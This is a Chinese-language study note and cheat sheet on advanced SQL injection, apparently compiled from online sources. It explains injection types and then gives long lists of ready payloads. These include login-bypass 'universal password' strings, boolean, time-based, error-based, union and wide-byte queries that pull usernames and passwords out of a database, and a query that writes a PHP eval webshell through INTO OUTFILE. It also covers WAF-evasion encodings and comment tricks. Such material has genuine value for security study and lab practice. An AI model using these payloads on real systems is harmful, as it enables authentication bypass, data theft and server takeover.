# SQL注入进阶

大部分内容查找自网络，自己只不过就是整理了一下，当作笔记用，有很多不足，请表哥们指点。

- [sql经验笔记](./sql经验笔记.html)
- [sql语句](./sql语句.html)
- [sql符号](./sql符号.html)
- [24字母](./24字母.html)
- [ascii](./ascii.html)

## SQL注入介绍

所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将(恶意)的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入(恶意)SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。造成SQL注入漏洞原因有两个：一个是没有对输入的数据进行过滤(过滤输入)，还有一个是没有对发送到数据库的数据进行转义(转义输出)。

## 常见的注入点

```linux
GET 请求参数：该请求在 URL 中发送参数。
POST 请求参数：数据被包含在请求体中。
HTTP Cookie参数：数据Cookie中可能会触发 SQL 注入漏洞
其他注入型数据：HTTP 请求的头部字段也可能会触发 SQL 注入漏洞
如：HTTP User-Agent头和HTTP Referer头
```

## 常见的脚本类型

```linux
1、LAMP: Linux+apache+PHP+MySQL
2、LNMP:Linux+Nginx+PHP+MySQL
3、Windows+IIS+.net+MSSql Server
4、Linux+Tomcat+JSP+MySQL
5、Linux+Tomcat+JSP+Oracle
6、asp+access
7、asp.net+MSSql
8、asp + mssql
```

## sql漏洞利用技术

```linux
安类型分：
1、数字型注入
    测试方法为：http://host/test.php?id=100 and 1=1
    接收参数为：100 and 1=1
    sql语句为： SELECT * FROM news WHERE id=100 and 1=1
2、字符型注入
    测试方法为：http://host/test.php?name=man' and '1'='1
    接收参数为：man' and '1'='1
    sql语句为：SELECT * FROM news WHERE name='man' and '1'='1'
3、搜索型注入点
    测试方法为：http://host//test.php?keyword=python%' and 1=1 and '%'='
    接收参数为：python%' and 1=1 and '%'='
    sql语句为：SELECT * FROM news WHERE keyword like '%python%' and 1=1 and '%'='%'
4、内联式SQL注入
    测试方法为：http://host//login.php  post参数为：name=' or ''='&pass=fuzz || name=fuzz&pass=' or ''='
    接收参数为：name='' or ''='' pass ='fuzz' || name='fuzz' pass ='' or ''=''
    sql语句为：AND的优先级是大于OR的，于是会先计算AND，然后之后才会计算OR
        SELECT * FROM admin WHER name='' or ''='' AND pass ='fuzz'  # 返回失败
        SELECT * FROM admin WHER name='fuzz' AND pass ='' or ''=''  # 返回成功
5、终止式SQL注入
    终止式SQL语句注入是指攻击者在注入SQL代码时，通过注释剩下的查询来成功结束该语句
    测试方法为：http://host//login.php  post参数为：name=' or ''='' --&pass=
    接收参数为：name='' or ''='' -- pass =''
    sql语句为：SELECT * FROM admin WHER name='' or ''='' --' AND pass =''

五种不同的注入模式：
1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
2、基于时间的盲注，用条件语句查看时间延迟语句是否执行来判断。
3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
4、联合查询注入，可以使用union的情况下的注入。
5、堆查询注入，用;结束当前语句,在后面执行自己的语句，可以同时执行多条语句的执行时的注入。
6、内联查询注入，在查询语句中嵌套sql语句
```

可以注入的数据库

```linux
MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB等，所有存储数据的数据库都有可能存在注入。
```

## 数据库元数据表

```linux
information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。

元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。

也就是说information_schma可以查到你的所有的搭建的数据库名、表名和列的数据类型，在一切条件未知的情况下，存在注入点的话我们可以直接尝试对information_schema进行访问，从而获得更多的信息。

SCHEMATA:提供了当前MySQL实例中所有数据库的信息
TABLES:所有数据库表的信息
CONLUMNS：提供了列信息
```

## 绕过验证(常见的为管理登陆)也称万能密码

```linux
(1) 用户名输入： 'or 1=1 or'  密码：任意
(2) Admin' -- (或'or 1=1 or' --)(admin or 1=1 --) (MSSQL)(直接输入用户名，不进行密码验证)
(3) 用户名输入：admin   密码输入：' or '1'='1  也可以
(4) 用户名输入：admin' or 'a'='a    密码输入：任意
(5) 用户名输入：' or 1=1 --
(6) 用户名输入：admin' or 1=1 --  密码输入：任意
(7) 用户名输入：1'or'1'='1'or'1'='1   密码输入：任意
```

## 测试注入点的语句

```linux
# 基础判断注入语句
||0--+
||1--+
&& true--+
&& false--+
and 1=1--+
and 1=2--+
and 2>1--+
and 2>3--+
and '1'='1
and '1'='2
and "1"="1"--+
and "1"="2"--+
and '1'='2' )
and ("x"="x
or 1=1 --+
or 1=2 --+
or ''=''--+
or 's'='s'--+
or ('a'='a
and 1=1 and '%'='
order+by+1--+
order+by+100--+
and length(database())>=1--+
and length(database())>=100--+
and (select count(*) from admin)>0; --+
and (select count(*) from admin)>100; --+
AND id != NULL; --+
or id != NULL; --+
and length((select user()))>=1--+
and length((select database()))>=1--+
and ord(substr(database(),1,1))=64--+
and ord(substr(database(),1,1))=150--+
and if(ascii(substr((select database()),1,1))>64, 1, 0)--+

# 判断时间注入语句
and sleep(3)--+
and (() or sleep(3))--+
and (select sleep(5))--+
and ('1'=' or sleep(3))--+
and if(length(database())>0,sleep(5),1)--+
and if(length((select user()))>1,sleep(10),0)--+
and if(length((select database()))>1,sleep(10),0)--+

# 判断报错注入语句
or updatexml(1,concat(0x5e5e,version(),0x5e5e),1)--+
union select 1,1,exp(~(select*from(select user())x))--+
union select 1,1,exp(~(select*from(select database())x))--+
union select updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
union select updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
union SELECT 1,1,ExtractValue('<a><b><b/></a>',concat('~',(select user()),'~'))--+
union SELECT 1,1,ExtractValue('<a><b><b/></a>',concat('~',(select database()),'~'))--+
union select count(*),1, concat('~',(select user()),'~', floor(rand()*2)) as a from information_schema.tables group by a--+

# 联合查询注入，要让前面的参数不正确，这个才显示
union+select+1--+
union+select+1,2,3,4,5,6,7,8,9--+
union select @@version --+
union select user() --+
union select database()--+

# 宽字节注入
%a1%27 or 1--+
%df%27 and 1--+
%df%27 or()or 0
%a1%27 order+by+1--+
%df%27 or 0 union select 1,group_concat(schema_name) from information_schema.schemata--+
```

## 常用函数整合语句

```sql
select @@datadir;                       # 数据库的存储目录
select @@basedir;                       # MYSQL 获取安装路径
select @@version_compile_os;            # 服务器的操作系统
select database();                      # 当前连接的数据库名称
select user();                          # 当前连接数据库的用户
select version();                       # 数据库的版本
SELECT left('abc',2)                    # 返回ab
SELECT right('abc',2)                   # 返回bc
select concat(1,2)                      # 将1和2连接成12
select concat_ws('--',1,2)              # 将1和2连接成1--2
select length(123);                     # 计算字符串的长度是3
select sleep(5);                        # 延时5秒显示
select rand();                          # 随机数
select floor(1.1);                      # 取整数
SELECT floor(rand()*2);                 # 生成0|1的随机数
select substr('abc',1,1);               # 截取,从1开始的
select mid('abc',3,1)                   # 截取,从1开始的
SELECT Ascii('a');                      # 返回字符的ascii码
SELECT ord('a');                        # 返回字符的ascii码
SELECT hex('a');                        # 返回16进制数
SELECT char(97);                        # 返回a
if(expr1,expr2,expr3):                  # 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
select count(*) from users;             # 返回users表中的数据条数
select length(database())>=1;           # 判断数据库的长度是否大于1
select @@datadir,@@basedir;             # 显示数据库的位置和安装位置
ascii(substr((select database()),1,1))          # 返回数据库名称的第一个字母,转化为ascii码
ascii(substr((select database()),1,1))>64       # ascii大于64就返回true，就返回1，否则返回0
ORD(MID(DATABASE(),1,1))>119                    # ASCII码是否大于119
SELECT concat((select database()));                     # 显示当前数据库名
SELECT CONCAT((SELECT database()), FLOOR(RAND()*2));    # 显示当前数据库名，并加一个随机数

# 如果ascii大于64就会显示，否则就不会显示
and if(ascii(substr((select database()),1,1))>64, 1, 0)

# 将每一行的name和pass连接起来，逗号隔开，一起输出
select group_concat(name,pass) from user;

# 将多行查询结果以逗号分隔全部输出，每一行的结果可用设置的分隔符作字段的间隔
select group_concat(concat_ws('--',name,pass)) from user

# 显示出的结果数量就是有多少条数据
SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)) FROM users;
SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)) FROM information_schema.schemata;
```

## 常用的语句

```sql
# 查看有多少个数据库
select COUNT(schema_name) from information_schema.schemata
# 查看所有数据库
select schema_name from information_schema.schemata LIMIT 4, 1
# 查看数据库有几个表
SELECT COUNT(table_name) FROM information_schema.TABLES WHERE table_schema = 'security';
# 查看数据库的所有表
select table_name from information_schema.tables where table_schema = 'security' LIMIT 4, 1
# 查看数据表有多少列
select COUNT(column_name) from information_schema.columns where table_schema = 'security' and table_name = 'users'
# 查看数据库表的所有列
select column_name from information_schema.columns where table_schema = 'security' and table_name = 'users' LIMIT 1,1;
# 查看数据表中有多少数据
SELECT COUNT(*) FROM `security`.`users`
# 查看数据表中的数据
select concat_ws('@',username,password) from `security`.`users` limit 0,1
# 写入文件
select '<?php @eval($_POST["giantbranch"]);?>' into outfile 'D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\Leaama.php'
# 导出文件
select load_file('D:\\xxx\\index.php') into outfile 'D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\xx.txt'
# 直接获取当前数据库的字段
select table_name from information_schema.tables where table_schema=database() limit 0,1
```

## 布尔型盲注

```sql
# 查看数据库的库
and ascii(substr((select schema_name from information_schema.schemata LIMIT 4, 1),1,1))=53--+
# 查看数据库的表
and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' LIMIT 0, 1),1,1))=53,1,0)--+
# 查看数据库的列
and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' LIMIT 0, 1),1,1))=53,1,0)--+
# 查看数据库的数据的长度
and length((select concat_ws('@',username,password) from `security`.`users` limit 2,1))>8 --+
# 查看数据库的数据
and ascii(substr((select concat_ws('@',username,password) from `security`.`users` limit 0,1),1)) >1 --+
and if(ascii(substr((SELECT concat_ws('@',username,password) FROM `security`.`users` LIMIT 0,1),1,1))>53,1,0)--+
# 完整的语句
SELECT if(ascii(substr((select concat_ws('@',username,password) from `security`.`users` limit 0,1),1,1))>53,1,0)
```

## 时间盲注

```sql
# 查看数据库的长度
and if(length((select database()))>10,sleep(10),0)--+
# 查看数据库的库
and if(ascii(substr((select schema_name from information_schema.schemata LIMIT 4, 1),1,1))=53,sleep(10),0)--+
and if(substr((select schema_name from information_schema.schemata LIMIT 4, 1),1,1)='s',sleep(10),0)--+
# 查看数据库的表
and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' LIMIT 0, 1),1,1))>53,sleep(10),0)--+
and if(substr((select table_name from information_schema.tables where table_schema='security' LIMIT 0, 1),1,1)='a',sleep(10),0)--+
# 查看数据库的列
and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' LIMIT 0, 1),1,1))>53,sleep(10),0)--+
and if(substr((select column_name from information_schema.columns where table_schema='security' and table_name='users' LIMIT 0, 1),1,1)='a',sleep(10),0)--+
# 查看数据库的数据的长度
and if(length((select concat_ws('@',username,password) from `security`.`users` limit 2,1))>8,sleep(10),0)--+
# 查看数据库的数据
and if(ascii(substr((SELECT concat_ws('@',username,password) FROM `security`.`users` LIMIT 0,1),1,1))>53,sleep(10),0)--+
```

## 报错注入

```sql
count函数报错回显，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。
count函数报错注入好像得mysql<5.7,这个方法有时候会报错,因为随机数重复,多试几遍几好了。还要注意列的长度
# count报错注入都是基于这句话的,可自己变形
union select count(*),1, concat((*payload*), floor(rand()*2)) as a from information_schema.tables group by a--+
# 查看用户
union select count(*),1, concat('~',(select user()),'~', floor(rand()*2)) as a from information_schema.tables group by a--+
# 查询mysql的数据库
union select count(*),1, concat('~',(select database()),'~', floor(rand()*2))as a from information_schema.tables group by a--+
# 查询mysql的数据库版本
union select count(*),1, concat('~',(select version()),'~', floor(rand()*2))as a from information_schema.tables group by a--+

updatexml函数报错，高版本的mysql已经修复了该bug
# updatexml函数报错回显,都是基于这句话的,可自己变形
union select updatexml(1,concat(0x7e,(*payload*),0x7e),1)--+
# 获取用户名
union select updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
# 获取当前数据库
union select updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
# 获取数据库
union select updatexml(1,concat(0x7e,(select  schema_name from information_schema.schemata limit 0,1),0x7e),1)--+
# 获取数据
union select updatexml(1,concat(0x7e,(SELECT concat_ws('@',username,password) FROM `security`.`users` LIMIT 0,1),0x7e),1)--+

extractvalue函数报错回显，注意字段的长度，不支持低版本 mysql
# extractvalue函数报错回显,都是基于这句话的,可自己变形
union SELECT 1,1,ExtractValue('<a><b><b/></a>',concat('~',(*payload*),'~'))--+
# 获取用户
union SELECT 1,1,ExtractValue('<a><b><b/></a>',concat('~',(select user()),'~'))--+
# 查看数据库名
union SELECT 1,1,ExtractValue('<a><b><b/></a>',concat('~',(select database()),'~'))--+
# 获取数据
union SELECT 1,1,ExtractValue('<a><b><b/></a>',concat('~',(SELECT concat_ws('@',username,password) FROM `security`.`users` LIMIT 0,1),'~'))--+

注意：extractvalue()函数，updatexml()函数能查询字符串的最大长度也是32，如果超过则也需要使用substring()函数截取，一次查看32位

Exp函数是以e为底的对数函数,exp()函数报错注入是一个Double型数据溢出
# exp函数报错回显,都是基于这句话的,可自己变形
union select 1,1,exp(~(select*from(*payload*)x))--+
# 获取用户
union select 1,1,exp(~(select*from(select user())x))--+
# 获取数据
union select 1,1,exp(~(select*from(SELECT concat_ws('@',username,password) FROM `security`.`users` LIMIT 0,1)x))--+

报错型输入还有很多函数可以利用，而且现在报错型注入用的并不多了，基本上都是盲注了。其中报错语句替换，最核心的还是concat函数
```

## 联合查询注入，要让前面的参数不正确，union查询的才显示

```sql
# 判断数据库列数
union+select+1,2,3--+
# 判断数据库
union select 1,database(),3--+
# 判断用户名
union select 1,user(),3--+
# 获取数据
union select 1,(SELECT concat_ws('@',username,password) FROM `security`.`users` LIMIT 0,1),3--+
# 获取数据
union select 1,3,group_concat(concat_ws('@',tryy,secret_GJ10)) from challenges.6tlnlghrs7--+
# 获取数据库
union select 1,3,schema_name from information_schema.schemata limit 0,1--+
```

## 宽字节注入，gbk网站独有的注入

```sql
# GBK编码，使用了addsalshes函数或者类似函数进行了转义，那么我们输入的参数1'，就会变为1\'
1、想办法给\前面再加一个\（或单数个即可），变成\\’，这样\被转义了，’逃出了限制，叫做‘逃逸
2、想办法把\弄没有

# 判断数据库列数
%df%27 or 0 union+select+1,2,3--+
# 判断数据库
%df%27 or 0 union select 1,database(),3--+
# 判断用户名
%df%27 or 0 union select 1,user(),3--+
# 获取数据库
%df%27 or 0 union select 1,2,group_concat(schema_name) from information_schema.schemata--+
# 获取数据
%df%27 or 0 union select 1,2,group_concat(concat_ws(username,password)) from security.users--+
```

## 绕过WAF的方法

从目前能找到的资料来看，我把这些绕过waf的技术分为9类，包含从初级到高级技巧

- 大小写混合

-15 uNIoN sELecT 1,2,3,4

- 替换关键字

-15 UNIunionON SELselectECT 1,2,3,4

- 使用编码

1. 常见URL Encode有：
    %20 -> （空格）-> + -> %2b
    %22 -> "
    %23 -> #    #传给服务器,需要进行URL编码
    %25 -> %
    %27 -> '
    0x7e -> ~
2. URL编码:1%252f%252a*/UNION%252f%252a /SELECT
3. 十六进制编码:-15 /!u%6eion/ /!se%6cect/ 1,2,3,4…
4. Unicode编码:
    常用的几个符号的一些Unicode编码：
    单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7
    空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0
    左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8
    右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9
    举例：?id=10%D6'%20AND%201=2%23　　

- 使用注释

常见的用于注释的符号有哪些：//, — , /**/, #, –+,– -, ;**，–a

1. 普通注释:-15 %55nION/**/%53ElecT 1,2,3,4 'union%a0select pass from users#
2. 内联注释:-15 /!UNION/ /!SELECT/ 1,2,3 ?page_id=null%0A///!50000%55nIOn//yoyu/all//%0A/!%53eLEct/%0A/nnaa/+1,2,3,4…

- 等价函数与命令

1. 函数或变量
    hex()、bin() ==> ascii()
    sleep() ==>benchmark()
    concat_ws()==>group_concat()
    mid()、substr() ==> substring()
    @@user ==> user()
    @@datadir ==> datadir()

2. 符号：
    and和or有可能不能使用，或者可以试下&&和||能不能用；还有=不能使用的情况，可以考虑尝试<、>，因为如果不小于又不大于，那边是等于了在看一下用得多的空格，可以使用如下符号表示其作用：%20 %09 %0a %0b %0c %0d %a0 /**/s

3. 生僻函数

```linux
MySQL/PostgreSQL支持XML函数：Select UpdateXML('<script x=_></script> ','/script/@x/','src=//evil.com');
?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))
SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror));　//postgresql
?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制
```

- 特殊符号

1. 使用反引号，例如selectversion()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用
2. 神奇的”-+.”，select+id-1+1.from users; “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤
3. @符号，select@^1.from users; @用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量
4. Mysql function() as xxx 也可不用as和空格　　 select-count(id)test from users; //绕过空格限制

部分可能发挥大作用的字符(未包括'、*、/等在内，考虑到前面已经出现较多次了)：`、~、!、@、%、()、[]、.、-、+ 、|、%00

一些和这些字符多少有点关系的操作符供参考：

```s
>>, <<, >=, <=, <>,<=>,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN
```

- HTTP参数控制

1.HPP(HTTP Parameter Polution)
2.HPF(HTTP Parameter Fragment)
3.HPC(HTTP Parameter Contamination)

- 缓冲区溢出

缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过

- 整合绕过

整合的意思是结合使用前面谈到的各种绕过技术，单一的技术可能无法绕过过滤机制，但是多种技术的配合使用成功的可能性就会增加不少了。这一方面来说是总体与局部和的关系，另一方面则是多种技术的使用创造了更多的可能性，除非每一种技术单独都无法使用，否则它们能产生比自身大得多的能量。

举例：
z.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 "A")..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…

id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -

?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--

不能用逗号需要变为
CASE WHEN (1=1) THEN (sleep(5)) ELSE (2) END
但空格也被过滤了，需要用括号代替空格（/*!*/ 空格 tab %a0 %0d%0a均被过滤了）
(CASE WHEN(1=1)THEN(sleep(1))ELSE(1)END);
admin'+1+' (false,注意把+换为%2b)
admin'+0+' (true,注意把+换为%2b)
